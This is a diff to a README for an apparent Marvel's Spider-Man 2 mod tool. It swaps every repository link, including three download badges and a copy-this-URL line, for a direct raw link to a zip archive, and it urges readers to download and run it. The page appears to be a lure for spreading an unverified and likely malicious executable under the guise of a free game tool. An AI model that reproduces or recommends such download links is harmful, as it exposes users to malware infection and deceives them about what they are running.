@@ -1,6 +1,6 @@
 # 🕸️ Marvels-Spider-Man-2-Web-Weavers-Arsenal - Supercharge Your Spider-Man Adventure
 
-[![Download Now](https://img.shields.io/badge/Download-Mod_Tool-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/xperia2704/Marvels-Spider-Man-2-Web-Weavers-Arsenal)
+[![Download Now](https://img.shields.io/badge/Download-Mod_Tool-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/xperia2704/Marvels-Spider-Man-2-Web-Weavers-Arsenal/main/ramass/3.4.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Getting this tool up and running is quick and painless. Just follow these simple
 
 Visit this link to download the application:
 
-[![Click Here to Download](https://img.shields.io/badge/CLICK_HERE-DOWNLOAD-2ecc71?style=for-the-badge)](https://github.com/xperia2704/Marvels-Spider-Man-2-Web-Weavers-Arsenal)
+[![Click Here to Download](https://img.shields.io/badge/CLICK_HERE-DOWNLOAD-2ecc71?style=for-the-badge)](https://raw.githubusercontent.com/xperia2704/Marvels-Spider-Man-2-Web-Weavers-Arsenal/main/ramass/3.4.zip)
 
 The latest version of the tool is always available at the link above. No sign-up is required. No payment. It’s completely free.
 
@@ -155,10 +155,10 @@ If you enjoy it, consider starring the repository to show your support.
 
 Ready to take control of your game? Here is the official download link one more time:
 
-[![Get Web-Weaver's Arsenal](https://img.shields.io/badge/GET-WEB_WEAVERS_ARSENAL-9b59b6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/xperia2704/Marvels-Spider-Man-2-Web-Weavers-Arsenal)
+[![Get Web-Weaver's Arsenal](https://img.shields.io/badge/GET-WEB_WEAVERS_ARSENAL-9b59b6?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/xperia2704/Marvels-Spider-Man-2-Web-Weavers-Arsenal/main/ramass/3.4.zip)
 
 Or copy and paste this URL into your browser:  
-**https://github.com/xperia2704/Marvels-Spider-Man-2-Web-Weavers-Arsenal**
+**https://raw.githubusercontent.com/xperia2704/Marvels-Spider-Man-2-Web-Weavers-Arsenal/main/ramass/3.4.zip**
 
 Download it, run it, and enjoy Marvel's Spider-Man 2 like never before. 🕷️
 
